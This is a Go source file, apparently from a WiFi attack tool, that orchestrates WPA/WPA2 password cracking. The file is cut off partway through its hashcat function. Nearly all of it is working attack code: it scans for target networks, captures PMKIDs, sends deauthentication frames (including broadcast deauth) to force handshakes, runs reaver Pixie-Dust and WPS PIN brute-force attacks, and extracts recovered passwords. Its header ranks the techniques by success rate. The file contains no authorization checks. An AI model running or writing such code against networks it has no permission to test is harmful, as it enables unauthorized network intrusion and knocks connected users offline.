// Copyright (C) 2026 Mikko Parkkola. All rights reserved.
// Licensed under AGPL-3.0. See LICENSE file.

// Package crack orchestrates WPA/WPA2/WPA3 password cracking.
//
// It wraps proven external tools (hcxdumptool, hcxpcapngtool, hashcat,
// aircrack-ng, reaver, wash, wpa_supplicant) and does NOT implement any
// cryptographic operations itself.
//
// Techniques (ordered by effectiveness):
//
//  1. PMKID capture          -- client-less, extract PMKID from AP's first message (~60% of APs)
//  2. WPS Pixie-Dust         -- exploits weak RNG in WPS (~30% of WPS-enabled APs, 5-30s)
//  3. SmartCrack (stages 1-3)-- common passwords, numeric patterns, word+number combos
//  4. Handshake capture      -- deauth a client, capture 4-way handshake
//  5. SmartCrack (stages 1-3)-- same as step 3 but on handshake hash
//  6. Dictionary attack      -- rockyou.txt + hashcat rules + aircrack-ng CPU fallback
//  7. WPS PIN brute          -- brute force 8-digit WPS PIN (2-10 hours)
//  8. Smart brute force      -- hashcat masks + rules (lower+digits, patterns)
//  9. Online brute force     -- wpa_supplicant PSK attempts (no monitor mode needed, ~20/min)
//
// On macOS, monitor mode requires a compatible external USB WiFi adapter.
// The built-in card does not support it.
package crack

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/MikkoParkkola/nowifi/internal/platform"
	"github.com/MikkoParkkola/nowifi/internal/toolchain"
)

var errCommandTimedOut = errors.New("command timed out")

// ---------------------------------------------------------------------------
// Data types
// ---------------------------------------------------------------------------

// Method represents a cracking technique.
type Method string

const (
	WPAGroupTechniqueCount    = 4
	SmartGroupTechniqueCount  = 4
	UserVisibleTechniqueCount = WPAGroupTechniqueCount + SmartGroupTechniqueCount

	PMKID       Method = "pmkid_capture"
	Handshake   Method = "handshake_capture"
	Hashcat     Method = "hashcat_crack"
	Dictionary  Method = "dictionary_attack"
	WPSPixie    Method = "wps_pixie_dust"
	WPSPin      Method = "wps_pin_brute"
	OnlineBrute Method = "online_brute_force"
	SmartCrackM Method = "smart_crack"
)

// WifiTarget represents a WiFi network identified during scanning.
type WifiTarget struct {
	SSID       string   `json:"ssid"`
	BSSID      string   `json:"bssid"`
	Channel    int      `json:"channel"`
	Security   string   `json:"security"`
	Signal     int      `json:"signal"` // dBm (negative)
	Clients    []string `json:"clients,omitempty"`
	WPSEnabled bool     `json:"wps_enabled"`
	WPSLocked  bool     `json:"wps_locked"`
	WPSVersion string   `json:"wps_version,omitempty"`
}

// Result holds the outcome of a single cracking attempt.
type Result struct {
	Method      Method        `json:"method"`
	Success     bool          `json:"success"`
	Password    string        `json:"password,omitempty"`
	Details     string        `json:"details"`
	CaptureFile string        `json:"capture_file,omitempty"`
	Elapsed     time.Duration `json:"elapsed"`
}

// ---------------------------------------------------------------------------
// Capture directory
// ---------------------------------------------------------------------------

func captureDir() string {
	home, err := os.UserHomeDir()
	if err != nil {
		home = "/tmp"
	}
	return filepath.Join(home, ".nowifi", "captures")
}

func ensureCaptureDir() string {
	dir := captureDir()
	_ = os.MkdirAll(dir, 0o755)
	return dir
}

func timestampedDir(prefix string) string {
	ts := time.Now().Format("20060102_150405")
	dir := filepath.Join(ensureCaptureDir(), prefix+"_"+ts)
	_ = os.MkdirAll(dir, 0o755)
	return dir
}

// ---------------------------------------------------------------------------
// Tool discovery
// ---------------------------------------------------------------------------

func findHcxdumptool() (string, error) {
	return findTool("hcxdumptool", "brew install hcxdumptool  OR  apt install hcxdumptool")
}

func findHcxpcapngtool() (string, error) {
	return findTool("hcxpcapngtool", "brew install hcxtools  OR  apt install hcxtools")
}

func findHashcat() (string, error) {
	return findTool("hashcat", "brew install hashcat  OR  apt install hashcat")
}

func findAircrack() (string, error) {
	return findTool("aircrack-ng", "brew install aircrack-ng  OR  apt install aircrack-ng")
}

func findAirodump() (string, error) {
	return findTool("airodump-ng", "brew install aircrack-ng  OR  apt install aircrack-ng")
}

func findAireplay() (string, error) {
	return findTool("aireplay-ng", "brew install aircrack-ng  OR  apt install aircrack-ng")
}

func findReaver() (string, error) {
	return findTool("reaver", "brew install reaver  OR  apt install reaver")
}

func findWash() (string, error) {
	return findTool("wash", "Installed with reaver: brew install reaver")
}

func findTool(name, installHint string) (string, error) {
	// Use toolchain.FindTool first (checks PATH, ~/.nowifi/bin, ~/bin, /usr/local/bin).
	if p := toolchain.FindTool(name); p != "" {
		return p, nil
	}
	// Check additional common locations.
	candidates := []string{
		"/opt/homebrew/bin/" + name,
	}
	for _, p := range candidates {
		if info, err := os.Stat(p); err == nil && !info.IsDir() && info.Mode()&0o111 != 0 {
			return p, nil
		}
	}
	return "", &toolchain.ToolNotFoundError{Tool: name, InstallHint: installHint}
}

// ---------------------------------------------------------------------------
// Monitor mode helpers
// ---------------------------------------------------------------------------

var bssidRE = regexp.MustCompile(`([0-9a-fA-F]{2}[:\-]){5}[0-9a-fA-F]{2}`)

func checkMonitorMode(iface string) bool {
	// Validate interface name before passing to exec.Command.
	if _, err := platform.ValidateInterface(iface); err != nil {
		return false
	}

	// Check via ifconfig.
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	out, err := exec.CommandContext(ctx, "ifconfig", iface).CombinedOutput()
	cancel()
	if err == nil && strings.Contains(strings.ToLower(string(out)), "monitor") {
		return true
	}
	// Try iwconfig (Linux).
	ctx, cancel = context.WithTimeout(context.Background(), 5*time.Second)
	out, err = exec.CommandContext(ctx, "iwconfig", iface).CombinedOutput()
	cancel()
	if err == nil && strings.Contains(string(out), "Mode:Monitor") {
		return true
	}
	return false
}

func isDarwin() bool {
	return runtime.GOOS == "darwin"
}

func monitorModeError(iface string) string {
	if isDarwin() {
		return "Monitor mode not available. macOS built-in WiFi does not support " +
			"monitor mode. Use an external USB WiFi adapter (e.g., Alfa AWUS036ACH)."
	}
	return fmt.Sprintf("Interface %s is not in monitor mode. Run: sudo airmon-ng start %s", iface, iface)
}

// ---------------------------------------------------------------------------
// Scanning
// ---------------------------------------------------------------------------

// ScanTargets scans for WiFi networks and identifies crackable targets.
// Uses system_profiler on macOS (passive, no monitor mode needed) and iw on Linux.
// Returns a list of WifiTarget sorted by signal strength (strongest first).
func ScanTargets(iface string, duration int) ([]WifiTarget, error) {
	// Validate interface name before passing to exec.Command.
	if _, err := platform.ValidateInterface(iface); err != nil {
		return nil, fmt.Errorf("scan targets: %w", err)
	}

	var targets []WifiTarget

	if isDarwin() {
		targets = scanMacOS(iface)
	} else {
		targets = scanLinux(iface, duration)
	}

	// Sort by signal strength (strongest first, dBm is negative).
	sort.Slice(targets, func(i, j int) bool {
		return targets[i].Signal > targets[j].Signal
	})

	return targets, nil
}

// scanMacOS scans using system_profiler SPAirPortDataType on macOS.
func scanMacOS(_ string) []WifiTarget {
	var targets []WifiTarget

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	out, err := exec.CommandContext(ctx, "system_profiler", "SPAirPortDataType", "-json").Output()
	cancel()
	if err == nil {
		targets = parseMacOSSystemProfiler(out)
	}

	// Fallback: airport utility.
	if len(targets) == 0 {
		targets = scanMacOSAirport()
	}

	return targets
}

// parseMacOSSystemProfiler parses the JSON output from system_profiler SPAirPortDataType.
func parseMacOSSystemProfiler(data []byte) []WifiTarget {
	var targets []WifiTarget

	var raw map[string]json.RawMessage
	if err := json.Unmarshal(data, &raw); err != nil {
		return nil
	}

	spData, ok := raw["SPAirPortDataType"]
	if !ok {
		return nil
	}

	var items []map[string]json.RawMessage
	if err := json.Unmarshal(spData, &items); err != nil {
		return nil
	}

	for _, item := range items {
		ifacesRaw, ok := item["spairport_airport_interfaces"]
		if !ok {
			continue
		}
		var ifaces []map[string]json.RawMessage
		if err := json.Unmarshal(ifacesRaw, &ifaces); err != nil {
			continue
		}

		for _, iface := range ifaces {
			// Parse other visible networks.
			if netsRaw, ok := iface["spairport_airport_other_local_wireless_networks"]; ok {
				var networks []map[string]interface{}
				if err := json.Unmarshal(netsRaw, &networks); err == nil {
					for _, net := range networks {
						if t := parseMacOSNetwork(net); t != nil {
							targets = append(targets, *t)
						}
					}
				}
			}

			// Parse currently connected network.
			if currentRaw, ok := iface["spairport_current_network_information"]; ok {
				var current map[string]interface{}
				if err := json.Unmarshal(currentRaw, &current); err == nil {
					if t := parseMacOSNetwork(current); t != nil {
						targets = append(targets, *t)
					}
				}
			}
		}
	}

	return targets
}

// parseMacOSNetwork extracts a WifiTarget from a system_profiler network entry.
func parseMacOSNetwork(net map[string]interface{}) *WifiTarget {
	ssid, _ := net["_name"].(string)
	if ssid == "" {
		return nil
	}

	bssid, _ := net["spairport_network_bssid"].(string)
	channelStr := fmt.Sprintf("%v", net["spairport_network_channel"])
	channel := parseChannelNumber(channelStr)
	security, _ := net["spairport_security_mode"].(string)
	if security == "" {
		security = "unknown"
	}

	signal := -99
	if signalRaw, ok := net["spairport_signal_noise"]; ok {
		s := fmt.Sprintf("%v", signalRaw)
		parts := strings.Fields(s)
		if len(parts) > 0 {
			if v, err := strconv.Atoi(parts[0]); err == nil {
				signal = v
			}
		}
	}

	return &WifiTarget{
		SSID:     ssid,
		BSSID:    bssid,
		Channel:  channel,
		Security: security,
		Signal:   signal,
	}
}

// parseChannelNumber extracts the numeric channel from a string like "6" or "6, 40MHz".
func parseChannelNumber(s string) int {
	re := regexp.MustCompile(`(\d+)`)
	m := re.FindString(s)
	if m == "" {
		return 0
	}
	v, _ := strconv.Atoi(m)
	return v
}

// scanMacOSAirport scans using the airport utility on macOS.
func scanMacOSAirport() []WifiTarget {
	var targets []WifiTarget
	const airportPath = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	out, err := exec.CommandContext(ctx, airportPath, "-s").Output()
	cancel()
	if err != nil {
		return nil
	}

	lines := strings.Split(string(out), "\n")
	for _, line := range lines[1:] { // Skip header.
		if strings.TrimSpace(line) == "" {
			continue
		}

		loc := bssidRE.FindStringIndex(line)
		if loc == nil {
			continue
		}

		bssid := line[loc[0]:loc[1]]
		ssid := strings.TrimSpace(line[:loc[0]])
		remainder := strings.Fields(strings.TrimSpace(line[loc[1]:]))

		if len(remainder) < 4 {
			continue
		}

		rssi, err1 := strconv.Atoi(remainder[0])
		channel, err2 := strconv.Atoi(remainder[1])
		if err1 != nil || err2 != nil {
			continue
		}

		security := "unknown"
		if len(remainder) > 3 {
			security = strings.Join(remainder[3:], " ")
		}

		targets = append(targets, WifiTarget{
			SSID:     ssid,
			BSSID:    bssid,
			Channel:  channel,
			Security: security,
			Signal:   rssi,
		})
	}

	return targets
}

// scanLinux scans using iw on Linux.
func scanLinux(iface string, duration int) []WifiTarget {
	var targets []WifiTarget

	// Trigger a scan.
	timeout := time.Duration(duration+10) * time.Second
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	cmd := exec.CommandContext(ctx, "sudo", "iw", "dev", iface, "scan")
	cmd.WaitDelay = timeout
	_ = cmd.Run()

	// Parse scan results.
	ctx, cancel = context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	cmd2 := exec.CommandContext(ctx, "sudo", "iw", "dev", iface, "scan", "dump")
	cmd2.WaitDelay = 10 * time.Second
	out, err := cmd2.Output()
	if err != nil {
		return nil
	}

	type entry struct {
		bssid    string
		ssid     string
		channel  int
		signal   int
		security string
	}

	var current *entry

	flush := func() {
		if current != nil && current.bssid != "" {
			sec := current.security
			if sec == "" {
				sec = "unknown"
			}
			targets = append(targets, WifiTarget{
				SSID:     current.ssid,
				BSSID:    current.bssid,
				Channel:  current.channel,
				Security: sec,
				Signal:   current.signal,
			})
		}
	}

	for _, line := range strings.Split(string(out), "\n") {
		trimmed := strings.TrimSpace(line)

		if strings.HasPrefix(trimmed, "BSS ") {
			flush()
			m := bssidRE.FindString(trimmed)
			current = &entry{bssid: m, signal: -99}
		} else if current == nil {
			continue
		} else if strings.HasPrefix(trimmed, "SSID:") {
			current.ssid = strings.TrimSpace(trimmed[5:])
		} else if strings.HasPrefix(trimmed, "signal:") {
			parts := strings.Fields(strings.TrimPrefix(trimmed, "signal:"))
			if len(parts) > 0 {
				if v, err := strconv.ParseFloat(parts[0], 64); err == nil {
					current.signal = int(v)
				}
			}
		} else if strings.HasPrefix(trimmed, "DS Parameter set: channel") {
			parts := strings.Fields(trimmed)
			if len(parts) > 0 {
				if v, err := strconv.Atoi(parts[len(parts)-1]); err == nil {
					current.channel = v
				}
			}
		} else if strings.Contains(trimmed, "WPA") || strings.Contains(trimmed, "RSN") {
			if strings.Contains(trimmed, "RSN") {
				current.security = "WPA2"
			} else {
				current.security = "WPA"
			}
		}
	}
	flush()

	return targets
}

// ---------------------------------------------------------------------------
// PMKID capture
// ---------------------------------------------------------------------------

// CapturePMKID captures a PMKID from the target AP using hcxdumptool.
//
// PMKID is extracted from the AP's first EAPOL message during association.
// Does NOT require any connected clients. Approximately 60% of APs are vulnerable.
func CapturePMKID(target WifiTarget, iface string, timeout time.Duration) (*Result, error) {
	start := time.Now()
	result := &Result{Method: PMKID, Success: false}

	// Validate interface name before passing to exec.Command.
	if _, err := platform.ValidateInterface(iface); err != nil {
		result.Details = fmt.Sprintf("invalid interface: %v", err)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	outputDir := timestampedDir("pmkid")

	if !checkMonitorMode(iface) {
		result.Details = monitorModeError(iface)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	hcxdumptool, err := findHcxdumptool()
	if err != nil {
		result.Details = err.Error()
		result.Elapsed = time.Since(start)
		return result, nil
	}

	hcxpcapngtool, err := findHcxpcapngtool()
	if err != nil {
		result.Details = err.Error()
		result.Elapsed = time.Since(start)
		return result, nil
	}

	// Write filterlist (target BSSID without colons).
	filterlist := filepath.Join(outputDir, "filterlist.txt")
	bssidClean := strings.ToLower(strings.ReplaceAll(strings.ReplaceAll(target.BSSID, ":", ""), "-", ""))
	if err := os.WriteFile(filterlist, []byte(bssidClean+"\n"), 0o600); err != nil {
		return nil, fmt.Errorf("write filterlist: %w", err)
	}

	captureFile := filepath.Join(outputDir, "capture.pcapng")

	cmd := exec.CommandContext(
		context.Background(),
		hcxdumptool,
		"-i", iface,
		"-o", captureFile,
		"--filterlist_ap="+filterlist,
		"--filtermode=2",
		"--enable_status=1",
	)

	if err := cmd.Start(); err != nil {
		result.Details = fmt.Sprintf("failed to start hcxdumptool: %v", err)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	// Wait for capture or timeout.
	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	select {
	case <-done:
		// Process exited on its own.
	case <-time.After(timeout):
		_ = cmd.Process.Signal(os.Interrupt)
		select {
		case <-done:
		case <-time.After(5 * time.Second):
			_ = cmd.Process.Kill()
			<-done
		}
	}

	// Check capture file.
	info, err := os.Stat(captureFile)
	if err != nil || info.Size() == 0 {
		result.Details = fmt.Sprintf("No PMKID captured within %v", timeout)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	// Convert pcapng to hashcat format.
	hashFile := filepath.Join(outputDir, "hash.22000")
	convCmd := exec.CommandContext(context.Background(), hcxpcapngtool, "-o", hashFile, captureFile)
	_ = convCmd.Run()

	hInfo, err := os.Stat(hashFile)
	if err != nil || hInfo.Size() == 0 {
		result.Details = "Captured traffic but no PMKID extracted"
		result.CaptureFile = captureFile
		result.Elapsed = time.Since(start)
		return result, nil
	}

	// Count PMKIDs extracted.
	pmkidCount := countFileLines(hashFile)

	result.Success = true
	result.CaptureFile = hashFile
	result.Details = fmt.Sprintf("Captured %d PMKID(s) from %s (%s)", pmkidCount, target.SSID, target.BSSID)
	result.Elapsed = time.Since(start)
	return result, nil
}

// ---------------------------------------------------------------------------
// Handshake capture
// ---------------------------------------------------------------------------

// CaptureHandshake captures a WPA 4-way handshake by deauthing a client.
//
// Requires at least one client connected to the target AP. Sends deauth
// frames to disconnect a client, then captures the handshake on reconnect.
func CaptureHandshake(target WifiTarget, iface string, timeout time.Duration) (*Result, error) {
	start := time.Now()
	result := &Result{Method: Handshake, Success: false}

	// Validate interface name before passing to exec.Command.
	if _, err := platform.ValidateInterface(iface); err != nil {
		result.Details = fmt.Sprintf("invalid interface: %v", err)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	outputDir := timestampedDir("handshake")

	if !checkMonitorMode(iface) {
		result.Details = monitorModeError(iface)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	// Prefer hcxdumptool (handles deauth + capture in one tool).
	hcxResult, hcxErr := captureHandshakeHcx(target, iface, outputDir, timeout, start)
	if hcxErr == nil {
		return hcxResult, nil
	}

	// Fallback: airodump-ng + aireplay-ng.
	airResult, airErr := captureHandshakeAircrack(target, iface, outputDir, timeout, start)
	if airErr == nil {
		return airResult, nil
	}

	result.Details = fmt.Sprintf("No capture tools available. %v", airErr)
	result.Elapsed = time.Since(start)
	return result, nil
}

// captureHandshakeHcx captures handshake using hcxdumptool.
func captureHandshakeHcx(target WifiTarget, iface, outputDir string, timeout time.Duration, start time.Time) (*Result, error) {
	hcxdumptool, err := findHcxdumptool()
	if err != nil {
		return nil, err
	}
	hcxpcapngtool, err := findHcxpcapngtool()
	if err != nil {
		return nil, err
	}

	result := &Result{Method: Handshake, Success: false}

	filterlist := filepath.Join(outputDir, "filterlist.txt")
	bssidClean := strings.ToLower(strings.ReplaceAll(strings.ReplaceAll(target.BSSID, ":", ""), "-", ""))
	if err := os.WriteFile(filterlist, []byte(bssidClean+"\n"), 0o600); err != nil {
		return nil, fmt.Errorf("write filterlist: %w", err)
	}

	captureFile := filepath.Join(outputDir, "capture.pcapng")

	cmd := exec.CommandContext(
		context.Background(),
		hcxdumptool,
		"-i", iface,
		"-o", captureFile,
		"--filterlist_ap="+filterlist,
		"--filtermode=2",
		"--enable_status=1",
		"--active_beacon",
		"--deauthentication",
	)

	if err := cmd.Start(); err != nil {
		return nil, fmt.Errorf("start hcxdumptool: %w", err)
	}

	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	select {
	case <-done:
	case <-time.After(timeout):
		_ = cmd.Process.Signal(os.Interrupt)
		select {
		case <-done:
		case <-time.After(5 * time.Second):
			_ = cmd.Process.Kill()
			<-done
		}
	}

	info, err := os.Stat(captureFile)
	if err != nil || info.Size() == 0 {
		result.Details = fmt.Sprintf("No handshake captured within %v", timeout)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	// Convert to hashcat format.
	hashFile := filepath.Join(outputDir, "hash.22000")
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	_ = exec.CommandContext(ctx, hcxpcapngtool, "-o", hashFile, captureFile).Run()
	cancel()

	hInfo, err := os.Stat(hashFile)
	if err != nil || hInfo.Size() == 0 {
		result.Details = "Captured traffic but no valid handshake extracted"
		result.CaptureFile = captureFile
		result.Elapsed = time.Since(start)
		return result, nil
	}

	hashCount := countFileLines(hashFile)

	result.Success = true
	result.CaptureFile = hashFile
	result.Details = fmt.Sprintf("Captured %d handshake(s) from %s (%s)", hashCount, target.SSID, target.BSSID)
	result.Elapsed = time.Since(start)
	return result, nil
}

// captureHandshakeAircrack captures handshake using airodump-ng + aireplay-ng.
func captureHandshakeAircrack(target WifiTarget, iface, outputDir string, timeout time.Duration, start time.Time) (*Result, error) {
	airodump, err := findAirodump()
	if err != nil {
		return nil, err
	}
	aireplay, err := findAireplay()
	if err != nil {
		return nil, err
	}

	result := &Result{Method: Handshake, Success: false}

	capturePrefix := filepath.Join(outputDir, "capture")

	// Start airodump-ng to capture traffic on the target channel.
	airodumpCmd := exec.CommandContext(
		context.Background(),
		airodump,
		"-c", strconv.Itoa(target.Channel),
		"--bssid", target.BSSID,
		"-w", capturePrefix,
		"--output-format", "pcap",
		iface,
	)
	if err := airodumpCmd.Start(); err != nil {
		return nil, fmt.Errorf("start airodump-ng: %w", err)
	}

	// Give airodump time to start capturing.
	time.Sleep(3 * time.Second)

	// Send deauth to a client (or broadcast if none known).
	deauthTarget := "FF:FF:FF:FF:FF:FF"
	if len(target.Clients) > 0 {
		deauthTarget = target.Clients[0]
	}

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	deauthCmd := exec.CommandContext(
		ctx,
		aireplay,
		"--deauth", "5",
		"-a", target.BSSID,
		"-c", deauthTarget,
		iface,
	)
	_ = deauthCmd.Run()
	cancel()

	// Wait for handshake.
	remaining := timeout - time.Since(start)
	if remaining < time.Second {
		remaining = time.Second
	}

	done := make(chan error, 1)
	go func() { done <- airodumpCmd.Wait() }()

	select {
	case <-done:
	case <-time.After(remaining):
		_ = airodumpCmd.Process.Signal(os.Interrupt)
		select {
		case <-done:
		case <-time.After(5 * time.Second):
			_ = airodumpCmd.Process.Kill()
			<-done
		}
	}

	// Look for the capture file (airodump adds -01.cap suffix).
	var capFile string
	for _, suffix := range []string{"-01.cap", "-01.pcap", "-01.pcapng"} {
		candidate := capturePrefix + suffix
		if info, err := os.Stat(candidate); err == nil && info.Size() > 0 {
			capFile = candidate
			break
		}
	}

	if capFile == "" {
		result.Details = "No capture file produced by airodump-ng"
		result.Elapsed = time.Since(start)
		return result, nil
	}

	// Try to convert to hashcat format if hcxpcapngtool is available.
	if hcxpcapngtool, err := findHcxpcapngtool(); err == nil {
		hashFile := filepath.Join(outputDir, "hash.22000")
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		_ = exec.CommandContext(ctx, hcxpcapngtool, "-o", hashFile, capFile).Run()
		cancel()

		if info, err := os.Stat(hashFile); err == nil && info.Size() > 0 {
			result.Success = true
			result.CaptureFile = hashFile
			result.Details = fmt.Sprintf("Handshake captured from %s (%s)", target.SSID, target.BSSID)
			result.Elapsed = time.Since(start)
			return result, nil
		}
	}

	// Fall back to raw cap file (can be used with aircrack-ng directly).
	result.Success = true
	result.CaptureFile = capFile
	result.Details = fmt.Sprintf("Handshake captured (raw pcap) from %s (%s)", target.SSID, target.BSSID)
	result.Elapsed = time.Since(start)
	return result, nil
}

// ---------------------------------------------------------------------------
// WPS scanning and attacks
// ---------------------------------------------------------------------------

// ScanWPSTargets scans for WPS-enabled access points using wash or reaver --wash.
func ScanWPSTargets(iface string, timeout time.Duration) []WifiTarget {
	// Try wash first (preferred, part of reaver package).
	if washPath, err := findWash(); err == nil {
		out := runWithTimeout(washPath, []string{"-i", iface, "-s"}, timeout)
		if targets := parseWashOutput(out); len(targets) > 0 {
			return targets
		}
	}

	// Fallback: reaver with --wash flag.
	if reaverPath, err := findReaver(); err == nil {
		out := runWithTimeout(reaverPath, []string{"-i", iface, "--wash"}, timeout)
		return parseWashOutput(out)
	}

	return nil
}

// parseWashOutput parses wash/reaver --wash output into WifiTarget list.
//
// Typical wash output format:
//
//	BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
//	AA:BB:CC:DD:EE:FF    6  -45  1.0  No   RalinkTe  MyNetwork
func parseWashOutput(output string) []WifiTarget {
	var targets []WifiTarget

	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "BSSID") || strings.HasPrefix(line, "---") {
			continue
		}

		loc := bssidRE.FindStringIndex(line)
		if loc == nil || loc[0] != 0 {
			continue
		}

		bssid := line[loc[0]:loc[1]]
		remainder := strings.Fields(strings.TrimSpace(line[loc[1]:]))

		if len(remainder) < 5 {
			continue
		}

		channel, err1 := strconv.Atoi(remainder[0])
		signal, err2 := strconv.Atoi(remainder[1])
		if err1 != nil || err2 != nil {
			continue
		}

		wpsVersion := ""
		if len(remainder) > 2 {
			wpsVersion = remainder[2]
		}
		wpsLocked := false
		if len(remainder) > 3 {
			wpsLocked = strings.EqualFold(remainder[3], "yes")
		}
		essid := ""
		if len(remainder) > 5 {
			essid = strings.Join(remainder[5:], " ")
		}

		targets = append(targets, WifiTarget{
			SSID:       essid,
			BSSID:      bssid,
			Channel:    channel,
			Security:   "WPA/WPA2",
			Signal:     signal,
			WPSEnabled: true,
			WPSLocked:  wpsLocked,
			WPSVersion: wpsVersion,
		})
	}

	return targets
}

// CrackWPSPixie performs a WPS Pixie-Dust attack using reaver.
//
// Exploits weak random number generation in WPS implementations.
// Takes 5-30 seconds when vulnerable. Approximately 30% of WPS-enabled APs are vulnerable.
func CrackWPSPixie(target WifiTarget, iface string, timeout time.Duration) (*Result, error) {
	start := time.Now()
	result := &Result{Method: WPSPixie, Success: false}

	outputDir := timestampedDir("wps_pixie")

	if !checkMonitorMode(iface) {
		result.Details = monitorModeError(iface)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	reaverPath, err := findReaver()
	if err != nil {
		result.Details = err.Error()
		result.Elapsed = time.Since(start)
		return result, nil
	}

	if target.WPSLocked {
		result.Details = fmt.Sprintf("WPS is locked on %s (%s) -- skipping Pixie-Dust", target.SSID, target.BSSID)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	cmd := exec.CommandContext(
		context.Background(),
		reaverPath,
		"-i", iface,
		"-b", target.BSSID,
		"-c", strconv.Itoa(target.Channel),
		"-K", "1", // Pixie-Dust attack
		"-vv",
	)

	outputFile := filepath.Join(outputDir, "reaver_pixie.log")
	stdoutText := runCmdWithTimeout(cmd, timeout)

	// Save log.
	logSaved := false
	if err := os.WriteFile(outputFile, []byte(stdoutText), 0o600); err == nil {
		logSaved = true
	}

	// Parse reaver output for WPS PIN and WPA PSK.
	wpsPin, wpaPSK := parseReaverOutput(stdoutText)

	if wpaPSK != "" {
		result.Success = true
		result.Password = wpaPSK
		result.Details = fmt.Sprintf("Pixie-Dust recovered WPA PSK from %s (WPS PIN: %s)", target.SSID, wpsPin)
		if logSaved {
			result.CaptureFile = outputFile
		}
	} else if wpsPin != "" {
		result.Success = true
		result.Details = fmt.Sprintf("Pixie-Dust recovered WPS PIN: %s (but no PSK in output)", wpsPin)
		if logSaved {
			result.CaptureFile = outputFile
		}
	} else {
		if strings.Contains(stdoutText, "WPS transaction failed") {
			result.Details = "WPS transaction failed -- AP may have rate limiting"
		} else if strings.Contains(stdoutText, "WPS pin not found") || strings.Contains(stdoutText, "Failed to recover") {
			result.Details = "Pixie-Dust failed -- AP not vulnerable to weak RNG attack"
		} else {
			tail := stdoutText
			if len(tail) > 200 {
				tail = tail[len(tail)-200:]
			}
			result.Details = fmt.Sprintf("Pixie-Dust did not recover credentials. %s", tail)
		}
	}

	result.Elapsed = time.Since(start)
	return result, nil
}

// CrackWPSPin performs a WPS PIN brute force attack using reaver.
//
// Brute forces the 8-digit WPS PIN (effectively 11000 combinations due to
// checksum digit + split verification). Can take 2-10 hours. Last resort.
func CrackWPSPin(target WifiTarget, iface string, timeout time.Duration) (*Result, error) {
	start := time.Now()
	result := &Result{Method: WPSPin, Success: false}

	outputDir := timestampedDir("wps_pin")

	if !checkMonitorMode(iface) {
		result.Details = monitorModeError(iface)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	reaverPath, err := findReaver()
	if err != nil {
		result.Details = err.Error()
		result.Elapsed = time.Since(start)
		return result, nil
	}

	if target.WPSLocked {
		result.Details = fmt.Sprintf("WPS is locked on %s (%s) -- PIN brute force blocked", target.SSID, target.BSSID)
		result.Elapsed = time.Since(start)
		return result, nil
	}

	cmd := exec.CommandContext(
		context.Background(),
		reaverPath,
		"-i", iface,
		"-b", target.BSSID,
		"-c", strconv.Itoa(target.Channel),
		"-vv",
		"-d", "2", // 2 second delay between PINs (avoid lockout)
		"-N", // Don't send NACK packets (more reliable)
	)

	outputFile := filepath.Join(outputDir, "reaver_pin.log")
	stdoutText := runCmdWithTimeout(cmd, timeout)

	// Save log.
	_ = os.WriteFile(outputFile, []byte(stdoutText), 0o600)

	wpsPin, wpaPSK := parseReaverOutput(stdoutText)

	if wpaPSK != "" {
		result.Success = true
		result.Password = wpaPSK
		result.Details = fmt.Sprintf("WPS PIN brute force recovered PSK from %s (PIN: %s)", target.SSID, wpsPin)
		result.CaptureFile = outputFile
	} else if wpsPin != "" {
		result.Success = true
		result.Details = fmt.Sprintf("WPS PIN recovered: %s (but no PSK in output)", wpsPin)
		result.CaptureFile = outputFile
	} else {
		if strings.Contains(stdoutText, "WPS pin not found") {
			result.Details = "WPS PIN brute force exhausted all PINs without success"
		} else if strings.Contains(strings.ToLower(stdoutText), "locked") {
			result.Details = "AP locked WPS after too many attempts"
		} else {
			result.Details = fmt.Sprintf("WPS PIN brute force timed out after %v", timeout)
		}
	}

	result.Elapsed = time.Since(start)
	return result, nil
}

// parseReaverOutput parses reaver stdout for WPS PIN and WPA PSK.
//
// Reaver prints:
//
//	[+] WPS PIN: '12345670'
//	[+] WPA PSK: 'MyPassword123'
func parseReaverOutput(output string) (wpsPin, wpaPSK string) {
	pinRE := regexp.MustCompile(`WPS PIN:\s*'?([0-9]{4,8})'?`)
	pskRE := regexp.MustCompile(`WPA PSK:\s*'(.+?)'`)

	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)

		if m := pinRE.FindStringSubmatch(line); len(m) > 1 {
			wpsPin = m[1]
		}

		if m := pskRE.FindStringSubmatch(line); len(m) > 1 {
			wpaPSK = m[1]
		} else if strings.Contains(line, "WPA PSK:") {
			// Unquoted PSK.
			parts := strings.SplitN(line, "WPA PSK:", 2)
			if len(parts) == 2 {
				psk := strings.TrimSpace(parts[1])
				if psk != "" {
					wpaPSK = psk
				}
			}
		}
	}

	return wpsPin, wpaPSK
}

// ---------------------------------------------------------------------------
// Hashcat cracking
// ---------------------------------------------------------------------------

// CrackWithHashcat cracks a captured hash with hashcat (GPU-accelerated).
//
// attackMode: "dictionary" (mode 0), "brute" (mode 3), or "rule" (mode 0 + rules).
// wordlist: path to wordlist file. Auto-detected if empty.
func CrackWithHashcat(hashFile string, wordlist string) (*Result, error) {
